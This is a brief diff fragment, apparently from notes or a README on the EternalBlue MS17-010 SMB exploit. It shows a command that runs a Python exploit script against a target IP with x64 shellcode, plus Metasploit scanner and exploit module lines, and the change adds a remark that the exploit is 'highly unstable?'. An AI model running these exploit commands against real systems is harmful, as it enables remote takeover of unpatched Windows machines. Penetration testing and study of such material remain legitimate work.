@@ -61,5 +61,5 @@ python eternalblue_exploit7.py <ip> shellcode/sc_x64.bin
 
 ```
 use auxiliary/scanner/smb/smb_ms17_010
-use exploit/windows/smb/ms17_010_eternalblue
+use exploit/windows/smb/ms17_010_eternalblue ==> highly unstable?
 ```
